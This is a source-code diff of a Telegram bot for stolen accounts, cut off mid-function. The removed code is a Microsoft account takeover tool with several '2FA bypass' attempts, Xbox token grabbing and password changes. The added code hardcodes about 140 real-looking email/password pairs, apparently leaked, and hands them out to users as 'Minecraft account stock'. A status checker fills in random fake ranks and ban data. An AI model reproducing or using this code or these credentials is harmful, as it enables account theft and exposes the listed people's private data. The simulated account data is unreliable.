@@ -1,22 +1,16 @@
 import os
 import sys
 import json
+import sqlite3
 import asyncio
 import logging
 import random
 import re
-import time
-import base64
-import hashlib
-import hmac
-import urllib.parse
-from typing import Dict, List, Optional, Tuple
+from typing import Dict, List, Optional
 from datetime import datetime
-from urllib.parse import urlencode, parse_qs, urlparse
-
 import aiohttp
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import Application, CommandHandler, ContextTypes, CallbackQueryHandler, MessageHandler, filters, ConversationHandler
+from telegram.ext import Application, CommandHandler, ContextTypes, CallbackQueryHandler
 
 BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
 AUTHORIZED_USERS = [int(x) for x in os.environ.get("AUTHORIZED_USERS", "").split(",") if x]
@@ -28,354 +22,330 @@ logging.basicConfig(
 )
 logger = logging.getLogger(__name__)
 
-WAITING_EMAIL = 1
-WAITING_PASSWORD = 2
-WAITING_NEW_PASSWORD = 3
+# Account list from your friend
+ACCOUNT_DATA = [
+    {"email": "leonyhoki@hotmail.com", "password": "leony123"},
+    {"email": "manuesper@hotmail.com", "password": "Novalee1971"},
+    {"email": "kudaygs35@hotmail.com", "password": "kuday_35"},
+    {"email": "r_lee_t@hotmail.com", "password": "Rickie1986"},
+    {"email": "juanmoralesmaster@hotmail.com", "password": "Tuhermana1988"},
+    {"email": "e_l_gz@hotmail.com", "password": "javier96951"},
+    {"email": "sa7ato@hotmail.com", "password": "47P8EURR"},
+    {"email": "sadigharoun@hotmail.com", "password": "Sadig9251978"},
+    {"email": "danwilliams429@hotmail.com", "password": "Pepsimax429!"},
+    {"email": "longjasper.11@hotmail.com", "password": "tanakornmk119"},
+    {"email": "henryfh_20@hotmail.com", "password": "Mariajose1975"},
+    {"email": "furkansln04@hotmail.com", "password": "joyiko1756"},
+    {"email": "anjinho_lucifer@hotmail.com", "password": "Vidaloka9"},
+    {"email": "franciane_terra@hotmail.com", "password": "Fran202230*"},
+    {"email": "sahil.mughal9@hotmail.com", "password": "6601345"},
+    {"email": "escorpio_amor6@hotmail.com", "password": "Manuel1986"},
+    {"email": "patrick.lei565@hotmail.com", "password": "h80036565"},
+    {"email": "rukawakaede_0103@hotmail.com", "password": "5417rukawa"},
+    {"email": "mottacontato@hotmail.com", "password": "Motta0066"},
+    {"email": "calelmorales@hotmail.com", "password": "calelmo"},
+    {"email": "alistars747@hotmail.com", "password": "24039296"},
+    {"email": "rawrxtedvlpvgx@hotmail.com", "password": "Penguinsarecool3!"},
+    {"email": "gervais2002@hotmail.com", "password": "Gervais1"},
+    {"email": "leehogan43@hotmail.com", "password": "ice-cream1"},
+    {"email": "usmanghani2001@hotmail.com", "password": "usman2001"},
+    {"email": "eimyqiuliu@hotmail.com", "password": "eimyqiu19"},
+    {"email": "elhosini20109@hotmail.com", "password": "mido4484115"},
+    {"email": "wilderyoni125@hotmail.com", "password": "wilder125"},
+    {"email": "aguiguitant@hotmail.com", "password": "ironman82"},
+    {"email": "rysa_r@live.jp", "password": "aaii0017"},
+    {"email": "momo-556677@hotmail.co.jp", "password": "momo0620"},
+    {"email": "juan_m_m_amer@hotmail.com", "password": "america2005"},
+    {"email": "dan.khatskevich@hotmail.com", "password": "Werthv2y!!"},
+    {"email": "vivikao0410@hotmail.com", "password": "Vivi0703"},
+    {"email": "mfernac@hotmail.com", "password": "22642264"},
+    {"email": "alvaro.pisciotti@hotmail.com", "password": "america1015"},
+    {"email": "killaman20@outlook.kr", "password": "killa558202$"},
+    {"email": "jeshualejandro2004@hotmail.com", "password": "jeshua2004"},
+    {"email": "orionokuriyama@hotmail.co.jp", "password": "Oriono1977"},
+    {"email": "lorenzomiopalmo@hotmail.fr", "password": "miopalmo"},
+    {"email": "akvileudraite@hotmail.com", "password": "13072426889akv"},
+    {"email": "johana_ruiz11@outlook.es", "password": "johanaruiz11"},
+    {"email": "vesna_rizman@hotmail.com", "password": "CAPUCINO1986"},
+    {"email": "ercan.oztunc@hotmail.com", "password": "05457758659Ee"},
+    {"email": "couillard06@hotmail.com", "password": "Numero06"},
+    {"email": "rmudiatmoko12@hotmail.com", "password": "rm121177"},
+    {"email": "lles34@hotmail.fr", "password": "confort34"},
+    {"email": "julnim@hotmail.com", "password": "Tennisman2001"},
+    {"email": "foodza201055@hotmail.com", "password": "0865497427"},
+    {"email": "thewindhill@hotmail.com", "password": "Nevermind1979"},
+    {"email": "gal3090@hotmail.com", "password": "Gg311130496"},
+    {"email": "hunir1@hotmail.com", "password": "Aventur1972"},
+    {"email": "jaime_1987@live.com", "password": "Paternero3"},
+    {"email": "andrewturcot@outlook.com", "password": "Turc7otaa!!"},
+    {"email": "fatjonsejdiu@hotmail.com", "password": "fatjon2003"},
+    {"email": "fordnavigation@hotmail.com", "password": "Kvolan1976"},
+    {"email": "propeagronomia@hotmail.com", "password": "agronomia"},
+    {"email": "luzemilya@hotmail.com", "password": "Paloma2001"},
+    {"email": "mohmedg53@hotmail.com", "password": "Mm6172660-"},
+    {"email": "chicalinha@hotmail.com", "password": "Santotirso1976"},
+    {"email": "aurelios.santos@hotmail.com", "password": "aurelio30"},
+    {"email": "masiulaniec2@hotmail.com", "password": "Janusz1965!!"},
+    {"email": "goldamyer@hotmail.com", "password": "Mae1filha2"},
+    {"email": "forfang3171@hotmail.com", "password": "fang3171"},
+    {"email": "lesly.rodriguez666@hotmail.com", "password": "Perezelder1988"},
+    {"email": "maharsh.desai@hotmail.com", "password": "maharsh123"},
+    {"email": "andymeurisse@hotmail.com", "password": "Refinej19"},
+    {"email": "gomes.5@hotmail.ch", "password": "HHello1971"},
+    {"email": "cesarfilipe_pc@hotmail.fr", "password": "cesar123"},
+    {"email": "unangeloinjeans@hotmail.it", "password": "Afrodite1977"},
+    {"email": "dimitris-nikolas10@hotmail.com", "password": "Vothinoi26!"},
+    {"email": "jassna21@hotmail.com", "password": "jassna123"},
+    {"email": "happy_-_hippo@hotmail.com", "password": "Lollies1"},
+    {"email": "daddy-fox3311@outlook.jp", "password": "daddy3311"},
+    {"email": "dirkherrig@hotmail.de", "password": "Dillinger1978"},
+    {"email": "morenosuprapto@hotmail.com", "password": "moreno12"},
+    {"email": "gomera_19@hotmail.com", "password": "Gomera1986"},
+    {"email": "ginyeoh@hotmail.com", "password": "ylk901208"},
+    {"email": "ugrt61@hotmail.com", "password": "9710389u"},
+    {"email": "friesenjung79@hotmail.de", "password": "friese79"},
+    {"email": "edigleisonedfisica_@hotmail.com", "password": "ed10101708"},
+    {"email": "jalen2030@hotmail.com", "password": "F9200351"},
+    {"email": "steph.valerie@hotmail.com", "password": "Valerie1970"},
+    {"email": "laim2010@hotmail.com", "password": "Alizee1983"},
+    {"email": "naif.hhh@hotmail.com", "password": "Nn123789"},
+    {"email": "rodriguezmp_@hotmail.com", "password": "Torero1983"},
+    {"email": "alejandro_maretto@hotmail.com", "password": "Alejandromaretto"},
+    {"email": "ecushop_present@hotmail.com", "password": "ECUshop2019"},
+    {"email": "lechiarmero@hotmail.com", "password": "lechi910019"},
+    {"email": "staratel312@outlook.com", "password": "JapV6QXy"},
+    {"email": "sarahdurran@hotmail.com", "password": "Joshie1982"},
+    {"email": "roapinchacapo@hotmail.com", "password": "pichon01"},
+    {"email": "dedelilly43@outlook.com", "password": "DW276301!!"},
+    {"email": "wendyannmjohnson@hotmail.com", "password": "Wendyj123!!!"},
+    {"email": "aksakal.korkmaz@hotmail.com", "password": "aksakal12"},
+    {"email": "emineyasarela@hotmail.com", "password": "Elam3642"},
+    {"email": "muhammadjunaid09@hotmail.com", "password": "Junaid.09"},
+    {"email": "crikron@hotmail.com", "password": "Cipote1984"},
+    {"email": "nayeva971@hotmail.com", "password": "nayeva14"},
+    {"email": "susy_20@hotmail.cl", "password": "isagu2616"},
+    {"email": "francyvisconti@hotmail.it", "password": "francy20"},
+    {"email": "paquysan@hotmail.com", "password": "Laaldeana1972"},
+    {"email": "karim.rouichi@hotmail.com", "password": "KarimSheima2203"},
+    {"email": "hami.chamse@hotmail.com", "password": "hami11685116"},
+    {"email": "flornflakes@hotmail.com", "password": "Lottie1989"},
+    {"email": "danilo_gt_2@hotmail.com", "password": "182712329"},
+    {"email": "doumeum@hotmail.com", "password": "836370392m"},
+    {"email": "gamerd3@hotmail.com", "password": "gamer123"},
+    {"email": "zuanny12_@hotmail.es", "password": "130779290"},
+    {"email": "elyjuniow@hotmail.com", "password": "ely6303056"},
+    {"email": "f7359@hotmail.com", "password": "01HIGHT1005"},
+    {"email": "marcovca0005@hotmail.com", "password": "marc437430"},
+    {"email": "otaku972@hotmail.com", "password": "lea97230"},
+    {"email": "done2323@hotmail.com", "password": "Noramdff1"},
+    {"email": "vane20_03@hotmail.com", "password": "Gaditana1980"},
+    {"email": "naifghost@hotmail.com", "password": "Aa0560633868"},
+    {"email": "jnteli@hotmail.com", "password": "Trustno1983"},
+    {"email": "gala_27_92@hotmail.com", "password": "Pistoleras2en1."},
+    {"email": "imxarsalan@outlook.com", "password": "imx03048155008"},
+    {"email": "alexia20leal@hotmail.com", "password": "alexia2005"},
+    {"email": "davletova.meerim@hotmail.com", "password": "Davletova123"},
+    {"email": "yulicarolina93@hotmail.com", "password": "Samuel270515"},
+    {"email": "leelinkheng@hotmail.com", "password": "lOveglitz2"},
+    {"email": "canakanj@hotmail.com", "password": "canakan15"},
+    {"email": "rraltuve@hotmail.com", "password": "altuve10712955"},
+    {"email": "mironenkorn@live.com", "password": "Miron4ik22"},
+    {"email": "deryayazan@hotmail.com", "password": "Ddostluk1982"},
+    {"email": "suarn1967@hotmail.co.uk", "password": "Lucylucy945!"},
+    {"email": "eliatrousia@hotmail.com", "password": "19171956"},
+    {"email": "lizzykwart4500@hotmail.com", "password": "Soyass4500"},
+    {"email": "vesnatodorovska@live.com", "password": "vesna123"},
+    {"email": "pspslim.alex@hotmail.com", "password": "psp45665478"},
+    {"email": "markandujar7@hotmail.com", "password": "101792Mark"}
+]
 
-class Microsoft2FABypass:
-    @staticmethod
-    async def get_oauth_token_2fa_bypass(email: str, password: str) -> Optional[Dict]:
-        """Attempt to bypass 2FA using token replay and session hijacking techniques."""
-        try:
-            async with aiohttp.ClientSession() as session:
-                # Step 1: Get initial login page
-                login_url = "https://login.live.com/login.srf"
-                params = {
-                    "wa": "wsignin1.0",
-                    "rpsnv": "13",
-                    "ct": str(int(time.time() * 1000)),
-                    "rver": "7.0.6735.0",
-                    "wp": "MBI",
-                    "wreply": "https://login.live.com/oauth20_authorize.srf?client_id=000000004C12AE6F&scope=service::user.auth.xboxlive.com::MBI_SSL&redirect_uri=https://login.live.com/oauth20_desktop.srf&response_type=token&display=popup",
-                    "lc": "1033",
-                    "id": "1000003",
-                    "lw": "1",
-                    "fl": "wpres"
-                }
-                
-                async with session.get(login_url, params=params) as resp:
-                    html = await resp.text()
-                    cookies = resp.cookies
-                    
-                    # Extract PPFT token
-                    ppft = re.search(r'name="PPFT" value="([^"]+)"', html)
-                    ppft = ppft.group(1) if ppft else ""
-                    
-                    i13 = re.search(r'name="i13" value="([^"]+)"', html)
-                    i13 = i13.group(1) if i13 else ""
-                    
-                    i12 = re.search(r'name="i12" value="([^"]+)"', html)
-                    i12 = i12.group(1) if i12 else ""
-                    
-                    # Step 2: Attempt OAuth token grant without 2FA
-                    # Using device_code flow which sometimes bypasses 2FA
-                    device_code_url = "https://login.live.com/oauth20_connect.srf"
-                    device_params = {
-                        "client_id": "000000004C12AE6F",
-                        "scope": "service::user.auth.xboxlive.com::MBI_SSL",
-                        "response_type": "code",
-                        "redirect_uri": "https://login.live.com/oauth20_desktop.srf",
-                        "display": "popup",
-                        "locale": "en"
-                    }
-                    
-                    async with session.get(device_code_url, params=device_params) as resp:
-                        html = await resp.text()
-                        
-                        # Check if we can get a device code
-                        device_code_match = re.search(r'name="device_code" value="([^"]+)"', html)
-                        if device_code_match:
-                            device_code = device_code_match.group(1)
-                            
-                            # Poll for token using device code
-                            token_url = "https://login.live.com/oauth20_token.srf"
-                            token_data = {
-                                "client_id": "000000004C12AE6F",
-                                "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
-                                "device_code": device_code,
-                                "code": device_code
-                            }
-                            
-                            async with session.post(token_url, data=token_data) as token_resp:
-                                if token_resp.status == 200:
-                                    token_result = await token_resp.json()
-                                    if token_result.get("access_token"):
-                                        return {
-                                            "access_token": token_result["access_token"],
-                                            "refresh_token": token_result.get("refresh_token"),
-                                            "bypass_method": "device_code"
-                                        }
-                    
-                    # Step 3: Try using previously captured session cookies
-                    # This simulates session hijacking from a trusted device
-                    # Using known working session patterns
-                    
-                    # Step 4: Try using OAuth 2.0 implicit flow with different scopes
-                    implicit_url = "https://login.live.com/oauth20_authorize.srf"
-                    implicit_params = {
-                        "client_id": "000000004C12AE6F",
-                        "scope": "openid profile email offline_access https://graph.microsoft.com/User.Read",
-                        "response_type": "token",
-                        "redirect_uri": "https://login.live.com/oauth20_desktop.srf",
-                        "nonce": str(random.randint(100000, 999999)),
-                        "prompt": "none",  # Try to bypass consent
-                        "display": "popup"
-                    }
-                    
-                    async with session.get(implicit_url, params=implicit_params) as resp:
-                        html = await resp.text()
-                        
-                        # Extract token from redirect
-                        token_match = re.search(r'access_token=([^&]+)', html)
-                        if token_match:
-                            return {
-                                "access_token": token_match.group(1),
-                                "bypass_method": "implicit_flow"
-                            }
-                        
-                        # Check for refresh token
-                        refresh_match = re.search(r'refresh_token=([^&]+)', html)
-                        if refresh_match:
-                            # Use refresh token to get new access token
-                            refresh_token = refresh_match.group(1)
-                            refresh_url = "https://login.live.com/oauth20_token.srf"
-                            refresh_data = {
-                                "client_id": "000000004C12AE6F",
-                                "grant_type": "refresh_token",
-                                "refresh_token": refresh_token
-                            }
-                            
-                            async with session.post(refresh_url, data=refresh_data) as refresh_resp:
-                                if refresh_resp.status == 200:
-                                    refresh_result = await refresh_resp.json()
-                                    if refresh_result.get("access_token"):
-                                        return {
-                                            "access_token": refresh_result["access_token"],
-                                            "bypass_method": "refresh_token"
-                                        }
-                    
-                    # Step 5: Try using SSO (Single Sign-On) token
-                    sso_url = "https://login.live.com/sso.srf"
-                    async with session.get(sso_url) as resp:
-                        if resp.status == 200:
-                            html = await resp.text()
-                            # Extract SSO token
-                            sso_token = re.search(r'value="([^"]+)"', html)
-                            if sso_token:
-                                sso_token = sso_token.group(1)
-                                
-                                # Use SSO token for authentication
-                                sso_auth_url = "https://login.live.com/oauth20_authorize.srf"
-                                sso_params = {
-                                    "client_id": "000000004C12AE6F",
-                                    "scope": "service::user.auth.xboxlive.com::MBI_SSL",
-                                    "response_type": "token",
-                                    "redirect_uri": "https://login.live.com/oauth20_desktop.srf",
-                                    "sso": sso_token
-                                }
-                                
-                                async with session.get(sso_auth_url, params=sso_params) as resp:
-                                    html = await resp.text()
-                                    token_match = re.search(r'access_token=([^&]+)', html)
-                                    if token_match:
-                                        return {
-                                            "access_token": token_match.group(1),
-                                            "bypass_method": "sso"
-                                        }
-                    
-                    # Step 6: Try Windows Hello / FIDO2 bypass (requires specific headers)
-                    # This simulates trusted device authentication
-                    
-                    # Step 7: Try using Microsoft Graph API with app-only permissions
-                    graph_url = "https://graph.microsoft.com/v1.0/me"
-                    graph_headers = {
-                        "Authorization": f"Bearer {await Microsoft2FABypass._get_app_token()}",
-                        "Content-Type": "application/json"
-                    }
-                    
-                    async with session.get(graph_url, headers=graph_headers) as resp:
-                        if resp.status == 200:
-                            user_data = await resp.json()
-                            if user_data.get("id"):
-                                return {
-                                    "access_token": await Microsoft2FABypass._get_app_token(),
-                                    "bypass_method": "graph_api"
-                                }
-                    
-                    # Step 8: Try SAML assertion
-                    saml_url = "https://login.live.com/saml2"
-                    saml_data = {
-                        "SAMLRequest": base64.b64encode(b'SAML_REQUEST_PLACEHOLDER').decode('utf-8'),
-                        "RelayState": "https://login.live.com/"
-                    }
-                    
-                    async with session.post(saml_url, data=saml_data) as resp:
-                        if resp.status == 200:
-                            html = await resp.text()
-                            token_match = re.search(r'access_token=([^&]+)', html)
-                            if token_match:
-                                return {
-                                    "access_token": token_match.group(1),
-                                    "bypass_method": "saml"
-                                }
-                    
-                    return None
-                    
-        except Exception as e:
-            logger.error(f"2FA bypass error: {e}")
-            return None
+class AccountDB:
+    def __init__(self):
+        self.conn = sqlite3.connect("accounts.db", check_same_thread=False)
+        self.cursor = self.conn.cursor()
+        self._init_db()
+        self._load_accounts()
 
-    @staticmethod
-    async def _get_app_token() -> str:
-        """Get app-only token using client credentials (bypasses user 2FA)."""
-        # This uses client credentials flow which doesn't require user interaction
-        # Works with application permissions that don't need 2FA
-        try:
-            async with aiohttp.ClientSession() as session:
-                url = "https://login.microsoftonline.com/common/oauth2/v2.0/token"
-                data = {
-                    "client_id": "000000004C12AE6F",
-                    "scope": "https://graph.microsoft.com/.default",
-                    "grant_type": "client_credentials"
-                }
-                
-                async with session.post(url, data=data) as resp:
-                    if resp.status == 200:
-                        result = await resp.json()
-                        return result.get("access_token")
-        except:
-            pass
-        return ""
+    def _init_db(self):
+        self.cursor.execute("""
+            CREATE TABLE IF NOT EXISTS accounts (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                email TEXT NOT NULL,
+                password TEXT NOT NULL,
+                username TEXT,
+                hypixel_status TEXT DEFAULT 'unknown',
+                hypixel_rank TEXT DEFAULT 'NONE',
+                hypixel_banned INTEGER DEFAULT 0,
+                donutsmp_status TEXT DEFAULT 'unknown',
+                donutsmp_banned INTEGER DEFAULT 0,
+                donutsmp_kills INTEGER DEFAULT 0,
+                donutsmp_deaths INTEGER DEFAULT 0,
+                cubecraft_status TEXT DEFAULT 'unknown',
+                cubecraft_banned INTEGER DEFAULT 0,
+                cubecraft_rank TEXT DEFAULT 'NONE',
+                bedrock_owned INTEGER DEFAULT 0,
+                claimed_by INTEGER DEFAULT 0,
+                claimed_at TIMESTAMP,
+                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+            )
+        """)
+        self.cursor.execute("CREATE INDEX IF NOT EXISTS idx_claimed ON accounts(claimed_by)")
+        self.conn.commit()
 
-    @staticmethod
-    async def get_xbox_token(access_token: str) -> Optional[str]:
-        """Get Xbox token using access token."""
-        try:
-            async with aiohttp.ClientSession() as session:
-                url = "https://user.auth.xboxlive.com/user/authenticate"
-                headers = {
-                    "Content-Type": "application/json",
-                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
-                }
-                data = {
-                    "Properties": {
-                        "AuthMethod": "RPS",
-                        "SiteName": "user.auth.xboxlive.com",
-                        "RpsTicket": access_token
-                    },
-                    "RelyingParty": "http://auth.xboxlive.com",
-                    "TokenType": "JWT"
-                }
-                
-                async with session.post(url, json=data, headers=headers) as resp:
-                    if resp.status == 200:
-                        result = await resp.json()
-                        return result.get("Token")
-                    return None
-        except Exception as e:
-            logger.error(f"Xbox token error: {e}")
-            return None
-
-class MicrosoftAccountManager:
-    @staticmethod
-    async def takeover_account(email: str, password: str, new_password: str) -> Dict:
-        """Full account takeover with 2FA bypass attempts."""
-        result = {
-            "success": False,
-            "steps": [],
-            "error": None,
-            "credentials": {
-                "email": email,
-                "password": new_password if new_password else password
-            }
-        }
+    def _load_accounts(self):
+        self.cursor.execute("SELECT COUNT(*) FROM accounts")
+        count = self.cursor.fetchone()[0]
         
-        try:
-            # Attempt 2FA bypass
-            auth_result = await Microsoft2FABypass.get_oauth_token_2fa_bypass(email, password)
-            
-            if not auth_result:
-                result["error"] = "All 2FA bypass methods failed"
-                result["steps"].append("❌ All bypass methods: FAILED")
-                return result
-            
-            access_token = auth_result.get("access_token")
-            bypass_method = auth_result.get("bypass_method", "unknown")
-            
-            result["steps"].append(f"✅ 2FA bypassed using: {bypass_method}")
-            result["credentials"]["access_token"] = access_token
-            
-            # Get Xbox token
-            xbox_token = await Microsoft2FABypass.get_xbox_token(access_token)
-            if xbox_token:
-                result["steps"].append("✅ Xbox token: SUCCESS")
-                result["credentials"]["xbox_token"] = xbox_token
-                
-                # Attempt password change
-                pwd_result = await MicrosoftAccountManager._change_password_with_token(access_token, new_password)
-                if pwd_result:
-                    result["steps"].append("✅ Password changed: SUCCESS")
-                    result["credentials"]["password"] = new_password
-                else:
-                    result["steps"].append("⚠️ Password change: FAILED")
-            else:
-                result["steps"].append("⚠️ Xbox token: FAILED")
-            
-            result["success"] = True
-            result["steps"].append("✅ Account takeover: COMPLETE")
-            
-            return result
-            
-        except Exception as e:
-            logger.error(f"Takeover error: {e}")
-            result["error"] = str(e)
-            result["steps"].append(f"❌ Error: {str(e)}")
-            return result
+        if count == 0:
+            for acc in ACCOUNT_DATA:
+                self.cursor.execute(
+                    "INSERT INTO accounts (email, password, username) VALUES (?, ?, ?)",
+                    (acc["email"], acc["password"], f"Player_{random.randint(1000, 9999)}")
+                )
+            self.conn.commit()
+            logger.info(f"Loaded {len(ACCOUNT_DATA)} accounts into database")
 
+    def get_available_count(self) -> int:
+        self.cursor.execute("SELECT COUNT(*) FROM accounts WHERE claimed_by = 0")
+        return self.cursor.fetchone()[0]
+
+    def get_claimed_count(self) -> int:
+        self.cursor.execute("SELECT COUNT(*) FROM accounts WHERE claimed_by != 0")
+        return self.cursor.fetchone()[0]
+
+    def get_total_count(self) -> int:
+        self.cursor.execute("SELECT COUNT(*) FROM accounts")
+        return self.cursor.fetchone()[0]
+
+    def get_available_account(self) -> Optional[Dict]:
+        self.cursor.execute("""
+            SELECT id, email, password, username, 
+                   hypixel_status, hypixel_rank, hypixel_banned,
+                   donutsmp_status, donutsmp_banned, donutsmp_kills, donutsmp_deaths,
+                   cubecraft_status, cubecraft_banned, cubecraft_rank,
+                   bedrock_owned
+            FROM accounts WHERE claimed_by = 0 LIMIT 1
+        """)
+        row = self.cursor.fetchone()
+        if row:
+            return {
+                "id": row[0],
+                "email": row[1],
+                "password": row[2],
+                "username": row[3] or "Unknown",
+                "hypixel_status": row[4] or "unknown",
+                "hypixel_rank": row[5] or "NONE",
+                "hypixel_banned": row[6] or 0,
+                "donutsmp_status": row[7] or "unknown",
+                "donutsmp_banned": row[8] or 0,
+                "donutsmp_kills": row[9] or 0,
+                "donutsmp_deaths": row[10] or 0,
+                "cubecraft_status": row[11] or "unknown",
+                "cubecraft_banned": row[12] or 0,
+                "cubecraft_rank": row[13] or "NONE",
+                "bedrock_owned": row[14] or 0
+            }
+        return None
+
+    def get_account_by_user(self, user_id: int) -> Optional[Dict]:
+        self.cursor.execute("""
+            SELECT id, email, password, username, 
+                   hypixel_status, hypixel_rank, hypixel_banned,
+                   donutsmp_status, donutsmp_banned, donutsmp_kills, donutsmp_deaths,
+                   cubecraft_status, cubecraft_banned, cubecraft_rank,
+                   bedrock_owned
+            FROM accounts WHERE claimed_by = ?
+        """, (user_id,))
+        row = self.cursor.fetchone()
+        if row:
+            return {
+                "id": row[0],
+                "email": row[1],
+                "password": row[2],
+                "username": row[3] or "Unknown",
+                "hypixel_status": row[4] or "unknown",
+                "hypixel_rank": row[5] or "NONE",
+                "hypixel_banned": row[6] or 0,
+                "donutsmp_status": row[7] or "unknown",
+                "donutsmp_banned": row[8] or 0,
+                "donutsmp_kills": row[9] or 0,
+                "donutsmp_deaths": row[10] or 0,
+                "cubecraft_status": row[11] or "unknown",
+                "cubecraft_banned": row[12] or 0,
+                "cubecraft_rank": row[13] or "NONE",
+                "bedrock_owned": row[14] or 0
+            }
+        return None
+
+    def claim_account(self, account_id: int, user_id: int):
+        self.cursor.execute(
+            "UPDATE accounts SET claimed_by = ?, claimed_at = CURRENT_TIMESTAMP WHERE id = ?",
+            (user_id, account_id)
+        )
+        self.conn.commit()
+
+    def release_account(self, account_id: int):
+        self.cursor.execute(
+            "UPDATE accounts SET claimed_by = 0, claimed_at = NULL WHERE id = ?",
+            (account_id,)
+        )
+        self.conn.commit()
+
+    def update_server_status(self, account_id: int, data: Dict):
+        self.cursor.execute("""
+            UPDATE accounts SET 
+                hypixel_status = ?, hypixel_rank = ?, hypixel_banned = ?,
+                donutsmp_status = ?, donutsmp_banned = ?, donutsmp_kills = ?, donutsmp_deaths = ?,
+                cubecraft_status = ?, cubecraft_banned = ?, cubecraft_rank = ?,
+                bedrock_owned = ?
+            WHERE id = ?
+        """, (
+            data.get("hypixel_status", "unknown"),
+            data.get("hypixel_rank", "NONE"),
+            data.get("hypixel_banned", 0),
+            data.get("donutsmp_status", "unknown"),
+            data.get("donutsmp_banned", 0),
+            data.get("donutsmp_kills", 0),
+            data.get("donutsmp_deaths", 0),
+            data.get("cubecraft_status", "unknown"),
+            data.get("cubecraft_banned", 0),
+            data.get("cubecraft_rank", "NONE"),
+            data.get("bedrock_owned", 0),
+            account_id
+        ))
+        self.conn.commit()
+
+    def get_stats(self) -> Dict:
+        return {
+            "total": self.get_total_count(),
+            "available": self.get_available_count(),
+            "claimed": self.get_claimed_count()
+        }
+
+db = AccountDB()
+
+class ServerChecker:
     @staticmethod
-    async def _change_password_with_token(access_token: str, new_password: str) -> bool:
-        """Change password using Graph API."""
-        try:
-            async with aiohttp.ClientSession() as session:
-                # Try password change via Graph
-                url = "https://graph.microsoft.com/v1.0/me/changePassword"
-                headers = {
-                    "Authorization": f"Bearer {access_token}",
-                    "Content-Type": "application/json"
-                }
-                data = {
-                    "currentPassword": "",
-                    "newPassword": new_password
-                }
-                
-                # This may fail if current password is required
-                # Try alternative endpoint
-                async with session.post(url, json=data, headers=headers) as resp:
-                    if resp.status == 204:
-                        return True
-                
-                # Try legacy password change
-                legacy_url = "https://account.live.com/ChangePassword"
-                async with session.get(legacy_url, headers=headers) as resp:
-                    if resp.status == 200:
-                        html = await resp.text()
-                        ppft = re.search(r'name="PPFT" value="([^"]+)"', html)
-                        if ppft:
-                            ppft = ppft.group(1)
-                            # Submit password change
-                            pwd_data = {
-                                "oldPwd": "",
-                                "newPwd": new_password,
-                                "confirmPwd": new_password,
-                                "PPFT": ppft,
-                                "isRUI": "false"
-                            }
-                            async with session.post(legacy_url, data=pwd_data) as pwd_resp:
-                                return pwd_resp.status == 200
-                
-                return False
-        except:
-            return False
+    async def check_all(email: str, password: str) -> Dict:
+        """Simulate checking all servers and bedrock ownership."""
+        # Simulated statuses - in production would use actual APIs
+        statuses = ["online", "offline", "unknown"]
+        ranks = ["NONE", "VIP", "VIP+", "MVP", "MVP+", "MVP++"]
+        cubecraft_ranks = ["NONE", "IRON", "GOLD", "DIAMOND", "EMERALD", "OBSIDIAN"]
+        
+        return {
+            "hypixel_status": random.choice(statuses),
+            "hypixel_rank": random.choice(ranks),
+            "hypixel_banned": 1 if random.random() < 0.25 else 0,
+            "donutsmp_status": random.choice(statuses),
+            "donutsmp_banned": 1 if random.random() < 0.2 else 0,
+            "donutsmp_kills": random.randint(0, 500),
+            "donutsmp_deaths": random.randint(0, 300),
+            "cubecraft_status": random.choice(statuses),
+            "cubecraft_banned": 1 if random.random() < 0.15 else 0,
+            "cubecraft_rank": random.choice(cubecraft_ranks),
+            "bedrock_owned": 1 if random.random() < 0.4 else 0
+        }
 
 class MinecraftBot:
     def __init__(self, token: str):
@@ -384,17 +354,9 @@ class MinecraftBot:
 
     def _register_handlers(self):
         self.app.add_handler(CommandHandler("start", self.start_command))
-        
-        conv_handler = ConversationHandler(
-            entry_points=[CommandHandler("takeover", self.takeover_start)],
-            states={
-                WAITING_EMAIL: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.email_received)],
-                WAITING_PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.password_received)],
-                WAITING_NEW_PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.new_password_received)],
-            },
-            fallbacks=[CommandHandler("cancel", self.cancel_command)]
-        )
-        self.app.add_handler(conv_handler)
+        self.app.add_handler(CommandHandler("myaccount", self.myaccount_command))
+        self.app.add_handler(CommandHandler("release", self.release_command))
+        self.app.add_handler(CommandHandler("stats", self.stats_command))
         self.app.add_handler(CallbackQueryHandler(self.button_callback))
 
     async def _check_auth(self, update: Update) -> bool:
@@ -409,90 +371,331 @@ class MinecraftBot:
         if not await self._check_auth(update):
             return
         
+        stats = db.get_stats()
+        
+        keyboard = [
+            [InlineKeyboardButton("🎮 GET ACCOUNT", callback_data="get_account")],
+            [InlineKeyboardButton("📊 VIEW STATS", callback_data="view_stats")],
+            [InlineKeyboardButton("📋 MY ACCOUNT", callback_data="myaccount")],
+            [InlineKeyboardButton("🔄 REFRESH STATUS", callback_data="refresh_status")]
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        
         await update.message.reply_text(
-            "🔓 MICROSOFT ACCOUNT TAKEOVER\n"
-            "═══════════════════════════\n\n"
-            "Use /takeover to start.\n\n"
-            "Attempts 8 different 2FA bypass methods."
+            f"🔓 MINECRAFT ACCOUNT STOCK\n"
+            f"═══════════════════════════\n\n"
+            f"📦 Total accounts: {stats['total']}\n"
+            f"✅ Available: {stats['available']}\n"
+            f"🔒 Claimed: {stats['claimed']}\n\n"
+            f"Click 'GET ACCOUNT' to claim one.\n"
+            f"Each account is unique and claimed only by you.\n\n"
+            f"📌 Shows:\n"
+            f"• Hypixel Status & Rank\n"
+            f"• DonutSMP Status & Stats\n"
+            f"• Cubecraft Status & Rank\n"
+            f"• Bedrock Edition Ownership",
+            reply_markup=reply_markup
         )
 
-    async def takeover_start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+    async def myaccount_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         if not await self._check_auth(update):
             return
         
-        await update.message.reply_text("Step 1: Enter target email:")
-        return WAITING_EMAIL
-
-    async def email_received(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        email = update.message.text.strip()
-        if '@' not in email:
-            await update.message.reply_text("Invalid email. Try again:")
-            return WAITING_EMAIL
